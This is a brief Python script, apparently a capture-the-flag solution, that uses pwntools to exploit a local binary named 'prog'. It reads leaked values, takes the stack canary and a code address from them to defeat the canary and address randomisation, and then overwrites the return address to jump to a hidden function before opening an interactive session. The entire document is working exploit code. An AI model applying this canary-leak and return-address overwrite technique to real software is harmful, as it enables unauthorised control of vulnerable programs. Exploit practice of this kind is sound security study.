from pwn import *

e = ELF('prog')

p = e.process()

p.readuntil(':\n')

disclosed = []
for i in range(9):
	disclosed.append(int(p.readline()))

cookie = disclosed[7]
e.address += disclosed[8] - e.sym.__libc_csu_init

addr = e.sym.unused_remainder_from_old_version

payload = 'A'
payload += p64(cookie)
payload += p64(0)
payload += p64(addr)

p.sendline(payload)
p.interactive()
